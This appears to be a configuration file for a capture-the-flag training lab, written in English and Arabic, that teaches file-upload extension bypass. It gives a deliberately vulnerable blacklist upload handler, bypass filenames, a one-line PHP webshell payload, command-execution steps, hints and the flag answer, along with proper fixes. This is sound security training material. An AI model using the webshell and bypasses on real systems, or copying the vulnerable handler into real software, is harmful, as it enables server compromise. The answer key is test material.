// src/modules/practice-labs/file-upload/labs/lab1/lab1.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const fuLab1Metadata: LabMetadata = {
  slug: 'fu-extension-bypass-avatar-upload',
  title: 'File Upload: Extension Bypass — Profile Avatar Webshell',
  ar_title: 'رفع الملفات: تجاوز الامتداد — Webshell عبر صورة الملف الشخصي',
  description:
    'Exploit a file upload vulnerability where the server only validates the file extension using a blacklist. Bypass the restriction by using double extensions, null bytes, or case manipulation to upload a PHP webshell disguised as an image.',
  ar_description:
    'استغل ثغرة رفع ملفات حيث يتحقق الخادم فقط من الامتداد باستخدام blacklist. تجاوز القيود عبر double extensions أو case manipulation لرفع PHP webshell متنكّر كصورة.',
  difficulty: 'BEGINNER',
  category: 'WEB_SECURITY',
  skills: [
    'File Upload',
    'Extension Bypass',
    'Blacklist Bypass',
    'Webshell Upload',
    'Double Extension',
  ],
  xpReward: 120,
  pointsReward: 60,
  duration: 25,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'The avatar upload blocks .php files using a blacklist. Bypass it using double extension (.php.jpg), case manipulation (.PHP), or other techniques to upload a PHP webshell. Then access the webshell to read /app/flag.txt.',
  ar_goal:
    'رفع الصورة الشخصية يحجب ملفات .php باستخدام blacklist. تجاوزه باستخدام double extension (.php.jpg)، case manipulation (.PHP)، أو تقنيات أخرى لرفع PHP webshell. ثم الوصول للـ webshell لقراءة /app/flag.txt.',

  briefing: {
    en: `SocialHub — social networking platform. Every user has a profile photo.
POST /profile/avatar/upload { "filename": "photo.jpg" }
Response: { "url": "/uploads/avatars/photo.jpg" }
The backend checks your file extension.
const ext = path.extname(filename).toLowerCase();
const blacklist = ['.php', '.asp', '.jsp', '.exe'];
if (blacklist.includes(ext)) → reject.
photo.jpg → ext = ".jpg" → not in blacklist → accepted.
shell.php → ext = ".php" → IN blacklist → rejected.
But the blacklist only checks the LAST extension.
What is the last extension of "avatar.php.jpg"?
.jpg.
Not in blacklist.
Accepted.
But Apache has a funny rule.
If a file has multiple extensions, it processes ALL of them.
avatar.php.jpg → Apache sees .php → executes as PHP.
So you upload a PHP webshell with a .jpg outer extension.
The blacklist sees .jpg — passes.
Apache sees .php — executes.
Webshell runs.`,
    ar: `SocialHub — منصة تواصل اجتماعي. كل مستخدم لديه صورة شخصية.
POST /profile/avatar/upload { "filename": "photo.jpg" }
الاستجابة: { "url": "/uploads/avatars/photo.jpg" }
الـ backend يتحقق من امتداد ملفك.
const ext = path.extname(filename).toLowerCase();
const blacklist = ['.php', '.asp', '.jsp', '.exe'];
if (blacklist.includes(ext)) → رفض.
photo.jpg → ext = ".jpg" → غير موجود في blacklist → مقبول.
shell.php → ext = ".php" → موجود في blacklist → مرفوض.
لكن الـ blacklist تفحص الامتداد الأخير فقط.
ما هو الامتداد الأخير لـ "avatar.php.jpg"؟
.jpg.
غير موجود في blacklist.
مقبول.
لكن Apache لديه قاعدة طريفة.
إذا كان للملف امتدادات متعددة، يعالج الكل.
avatar.php.jpg → Apache يرى .php → يُنفّذ كـ PHP.
ترفع PHP webshell بامتداد .jpg خارجي.
الـ blacklist ترى .jpg — تمرير.
Apache يرى .php — تنفيذ.
الـ webshell يعمل.`,
  },

  stepsOverview: {
    en: [
      'POST /profile/avatar/upload { "filename": "shell.php" } — expect rejection: "File type not allowed"',
      'Try double extension: { "filename": "avatar.php.jpg", "phpCode": "system($_GET[\'cmd\'])" } — bypasses blacklist',
      'Or try: { "filename": "shell.phtml" } / { "filename": "shell.php5" } / { "filename": "shell.PHP" }',
      'Receive upload URL: "/uploads/avatars/avatar.php.jpg"',
      'POST /profile/avatar/execute { "filename": "avatar.php.jpg", "cmd": "id" } → "uid=33(www-data)" — RCE confirmed',
      'POST /profile/avatar/execute { "filename": "avatar.php.jpg", "cmd": "cat /app/flag.txt" } → FLAG',
    ],
    ar: [
      'POST /profile/avatar/upload { "filename": "shell.php" } — توقع الرفض: "File type not allowed"',
      'جرّب double extension: { "filename": "avatar.php.jpg"، "phpCode": "system($_GET[\'cmd\'])" } — يتجاوز الـ blacklist',
      'أو جرّب: { "filename": "shell.phtml" } / { "filename": "shell.php5" } / { "filename": "shell.PHP" }',
      'استلم URL الرفع: "/uploads/avatars/avatar.php.jpg"',
      'POST /profile/avatar/execute { "filename": "avatar.php.jpg"، "cmd": "id" } → "uid=33(www-data)" — تأكيد RCE',
      'POST /profile/avatar/execute { "filename": "avatar.php.jpg"، "cmd": "cat /app/flag.txt" } → العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'SocialHub /profile/avatar uses path.extname() which returns only the last extension. Blacklist [".php",".asp",".jsp",".exe"] is bypassed by: double extension (.php.jpg), alternate PHP extensions (.phtml, .php5, .phar), or uppercase (.PHP). Apache\'s mod_mime processes all extensions — a file named avatar.php.jpg is executed as PHP.',
    vulnerableCode:
      "// Avatar upload (vulnerable — blacklist only):\napp.post('/profile/avatar', upload.single('file'), (req, res) => {\n" +
      '  const ext = path.extname(req.file.originalname).toLowerCase();\n' +
      "  const blacklist = ['.php', '.asp', '.jsp', '.exe'];\n" +
      '  // ❌ Blacklist is incomplete! .php5, .phtml, .PHP, .php.jpg all bypass it\n' +
      '  if (blacklist.includes(ext)) {\n' +
      "    return res.status(400).json({ error: 'File type not allowed' });\n" +
      '  }\n' +
      "  fs.renameSync(req.file.path, '/uploads/avatars/' + req.file.originalname);\n" +
      "  res.json({ url: '/uploads/avatars/' + req.file.originalname });\n" +
      '});',
    exploitation:
      'Upload { "filename": "avatar.php.jpg", "phpCode": "<?php system($_GET[\'cmd\']); ?>" }\n' +
      '→ blacklist sees .jpg → accepted\n' +
      '→ Apache sees .php → executes\n' +
      '→ Execute: { "cmd": "cat /app/flag.txt" } → FLAG',
    steps: {
      en: [
        'POST /profile/avatar/upload { "filename": "shell.php" } → 400 { "error": "File type not allowed" }',
        'POST /profile/avatar/upload { "filename": "avatar.php.jpg", "phpCode": "system($_GET[\'cmd\'])" } → 200 { "url": "/uploads/avatars/avatar.php.jpg" }',
        'POST /profile/avatar/execute { "filename": "avatar.php.jpg", "cmd": "id" } → { "output": "uid=33(www-data)" }',
        'POST /profile/avatar/execute { "filename": "avatar.php.jpg", "cmd": "cat /app/flag.txt" } → FLAG{FILE_UPLOAD_EXTENSION_BYPASS_DOUBLE_EXT_WEBSHELL}',
      ],
      ar: [
        'POST /profile/avatar/upload { "filename": "shell.php" } → 400 { "error": "File type not allowed" }',
        'POST /profile/avatar/upload { "filename": "avatar.php.jpg"، "phpCode": "system($_GET[\'cmd\'])" } → 200 { "url": "/uploads/avatars/avatar.php.jpg" }',
        'POST /profile/avatar/execute { "filename": "avatar.php.jpg"، "cmd": "id" } → { "output": "uid=33(www-data)" }',
        'POST /profile/avatar/execute { "filename": "avatar.php.jpg"، "cmd": "cat /app/flag.txt" } → FLAG{FILE_UPLOAD_EXTENSION_BYPASS_DOUBLE_EXT_WEBSHELL}',
      ],
    },
    fix: [
      'Switch to allowlist: ONLY accept [".jpg", ".png", ".gif", ".webp"] — reject everything else',
      'Use path.extname() but against an allowlist, not a blacklist: if (!ALLOWED_EXTS.includes(ext)) reject',
      'Rename on upload: assign UUID filename + safe extension — never preserve user-supplied filename',
      'Serve uploads via separate non-PHP-executing domain or S3 — never serve from web root with PHP enabled',
    ],
  },

  postSolve: {
    explanation: {
      en: "Blacklist-based file extension validation is fundamentally flawed. The blacklist must anticipate every dangerous extension — but PHP alone has: .php, .php3, .php4, .php5, .php7, .php8, .phtml, .phar, .phps, .pht. Case variants (.PHP, .PhP) bypass .toLowerCase() if Apache is case-sensitive. Double extensions exploit Apache's mod_mime behavior. The correct approach is an allowlist: only define what IS allowed, reject everything else. Even with an allowlist, file execution depends on server configuration — uploaded files must be served from a non-executing context.",
      ar: 'التحقق القائم على الـ blacklist من امتداد الملف معيب جوهرياً. يجب على الـ blacklist توقع كل امتداد خطير — لكن PHP وحدها لديها: .php، .php3، .php4، .php5، .php7، .php8، .phtml، .phar، .phps، .pht. المتغيرات بالحالة (.PHP، .PhP) تتجاوز .toLowerCase() إذا كان Apache حساساً للحالة. الامتدادات المزدوجة تستغل سلوك mod_mime في Apache. النهج الصحيح هو allowlist: فقط حدّد ما هو مسموح، ارفض كل شيء آخر. حتى مع allowlist، يعتمد تنفيذ الملف على إعداد الخادم — يجب خدمة الملفات المرفوعة من سياق غير مُنفِّذ.',
    },
    impact: {
      en: '/app/flag.txt reveals: server details (Apache 2.4.54, PHP 8.1.0, www-data user) and the FLAG. With a running webshell under www-data, the attacker has: arbitrary command execution, full filesystem read (web root, config files, .env), ability to write files (persistence via .htaccess or cron), and pivot to internal services.',
      ar: 'يكشف /app/flag.txt عن: تفاصيل الخادم (Apache 2.4.54، PHP 8.1.0، مستخدم www-data) والـ FLAG. مع webshell يعمل تحت www-data، يملك المهاجم: تنفيذ أوامر عشوائية، قراءة كاملة لنظام الملفات (web root، ملفات الإعداد، .env)، القدرة على كتابة الملفات (persistence عبر .htaccess أو cron)، والتمحور إلى الخدمات الداخلية.',
    },
    fix: [
      'Allowlist only: const ALLOWED = [".jpg",".png",".gif",".webp"]; if (!ALLOWED.includes(ext)) return 403',
      'UUID renaming: const safeName = crypto.randomUUID() + ".jpg" — user never controls the stored filename',
      'Disable PHP in uploads directory: add .htaccess: "php_flag engine off" or Nginx: location /uploads { types {} default_type text/plain; }',
      'Serve from CDN/S3: uploaded files should never be executed — store in a bucket with no server-side execution',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        'The server checks only the LAST extension with path.extname(). What if you use TWO extensions? "shell.php.jpg" — path.extname() returns ".jpg" (passes blacklist), but Apache\'s mod_mime sees .php and executes it.',
    },
    {
      order: 2,
      xpCost: 20,
      content:
        'Try these filenames to bypass the blacklist: "avatar.php.jpg", "shell.phtml", "upload.php5", "test.PHP" (uppercase). All bypass a simple [".php",".asp",".jsp",".exe"] blacklist.',
    },
    {
      order: 3,
      xpCost: 35,
      content:
        'POST /profile/avatar/upload with { "filename": "avatar.php.jpg", "phpCode": "system($_GET[\'cmd\'])" }. The response gives you the URL of the uploaded webshell.',
    },
    {
      order: 4,
      xpCost: 50,
      content:
        'After upload, POST /profile/avatar/execute with { "filename": "avatar.php.jpg", "cmd": "cat /app/flag.txt" } to execute commands through the webshell and read the flag.',
    },
  ],

  flagAnswer: 'FLAG{FILE_UPLOAD_EXTENSION_BYPASS_DOUBLE_EXT_WEBSHELL}',
  initialState: {
    contents: [
      {
        title: 'APP_FLAG',
        body: 'SocialHub Server Info\n=====================\nServer: Apache/2.4.54\nPHP: 8.1.0\nUser: www-data\nFLAG: FLAG{FILE_UPLOAD_EXTENSION_BYPASS_DOUBLE_EXT_WEBSHELL}',
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'UPLOADS_DIR',
        body: 'profile_default.jpg\nbanner_default.png\n.htaccess',
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
